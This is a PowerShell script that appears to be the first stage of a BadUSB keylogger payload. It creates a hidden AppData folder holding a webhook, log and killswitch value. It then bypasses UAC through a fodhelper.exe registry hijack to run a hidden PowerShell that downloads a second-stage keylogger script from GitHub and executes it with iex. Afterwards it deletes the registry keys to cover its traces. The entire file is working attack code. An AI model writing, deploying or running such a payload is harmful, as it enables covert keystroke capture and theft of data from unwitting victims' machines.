if (![System.IO.Directory]::Exists("$env:appdata\-locker")){New-Item -ItemType Directory -Force -Path "$env:appdata\-locker"};
echo $dc > "$env:appdata\-locker\wh.txt";
echo $log > "$env:appdata\-locker\log.txt";
echo $ks > "$env:appdata\-locker\killswitch.txt";

function s1 {
	$user = "$env:COMPUTERNAME\$env:USERNAME"
	$isAdmin = (Get-LocalGroupMember 'Administrators').Name -contains $user
if($isAdmin){
	$259="powershell.exe -w h iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/s2.ps1 | iex";
	reg add "HKCU\Software\Classes\.259\Shell\Open\command" /d $259 /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".259" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.259\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;

	}
	else{
	Break
	}
}

s1
